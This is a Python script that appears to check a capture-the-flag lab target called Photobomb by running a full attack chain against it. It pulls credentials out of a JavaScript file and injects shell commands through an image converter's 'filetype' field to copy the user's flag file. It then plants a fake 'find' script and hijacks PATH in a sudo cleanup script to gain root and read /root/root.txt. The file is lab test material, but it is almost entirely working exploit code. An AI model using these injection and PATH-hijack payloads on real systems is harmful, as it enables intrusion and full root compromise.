#!/usr/bin/env python3
"""Independent network-only attacker for the Photobomb command injection and sudo PATH chain."""
import base64
import os
import socket
import urllib.error
import urllib.parse
import urllib.request

BASE = os.environ.get("TARGET_URL", "http://photobomb-target").rstrip("/")
EXPECTED_USER_FLAG = os.environ["EXPECTED_USER_FLAG"]
EXPECTED_ROOT_FLAG = os.environ["EXPECTED_ROOT_FLAG"]
AUTH = "Basic " + base64.b64encode(b"pH0t0:b0Mb!").decode()


def request(path, body=None, auth=False, timeout=15):
    headers = {}
    if auth:
        headers["Authorization"] = AUTH
    if body is not None:
        headers["Content-Type"] = "application/x-www-form-urlencoded"
    req = urllib.request.Request(BASE + path, data=body, headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as response:
            return response.status, response.headers, response.read()
    except urllib.error.HTTPError as error:
        return error.code, error.headers, error.read()


def submit(filetype):
    body = urllib.parse.urlencode({
        "photo": "voicu-apostol-MWER49YaD-M-unsplash.jpg",
        "filetype": filetype,
        "dimensions": "300x200",
    }).encode()
    return request("/printer", body=body, auth=True, timeout=20)


host = urllib.parse.urlsplit(BASE).hostname
with socket.create_connection((host, 22), timeout=5) as sock:
    assert sock.recv(180).startswith(b"SSH-2.0-"), "OpenSSH banner missing"

status, _, home = request("/")
assert status == 200 and b"Welcome to your new Photobomb franchise" in home

status, _, js = request("/photobomb.js")
assert status == 200 and b"pH0t0" in js and b"b0Mb!" in js, "Tech-support credential clue missing"

status, _, _ = request("/printer")
assert status == 401, f"/printer must require HTTP Basic Auth, got {status}"
status, _, page = request("/printer", auth=True)
assert status == 200 and b"Select an image" in page and b"voicu-apostol" in page
print("PASS: public reconnaissance -> JavaScript credential clue -> protected printer page", flush=True)

status, headers, image = submit("jpg")
assert status == 200 and headers.get("Content-Type", "").startswith("image/jpeg")
assert image.startswith(b"\xff\xd8"), "Normal ImageMagick conversion did not return JPEG"
print("PASS: normal printer request executes real ImageMagick conversion", flush=True)

# The value passes the application's prefix check, then reaches system() as shell syntax.
submit("jpg; /bin/cp /home/wizard/user.txt public/ui_images/user-proof.txt;#")
status, _, user_proof = request("/ui_images/user-proof.txt")
assert status == 200 and EXPECTED_USER_FLAG.encode() in user_proof, (
    "The command-injection path did not expose the exact per-instance User Flag"
)
print("PASS: filetype command injection executes as wizard and returns exact User Flag", flush=True)

root_payload = (
    "jpg; printf '%s\\n' '#!/bin/sh' "
    "'/usr/bin/id > public/ui_images/root-proof.txt' "
    "'/bin/cat /root/root.txt >> public/ui_images/root-proof.txt' "
    "> find; chmod 0755 find; "
    "sudo PATH=/home/wizard/photobomb:/usr/bin:/bin /opt/cleanup.sh;#"
)
submit(root_payload)
status, _, root_proof = request("/ui_images/root-proof.txt")
assert status == 200 and b"uid=0(root)" in root_proof, (
    "The real sudo cleanup script did not execute the PATH-resolved program as UID 0"
)
assert EXPECTED_ROOT_FLAG.encode() in root_proof, (
    "The PATH-hijack route did not return the exact per-instance Root Flag"
)
print("PASS: sudo SETENV cleanup script -> writable PATH entry -> real UID 0 and exact Root Flag", flush=True)
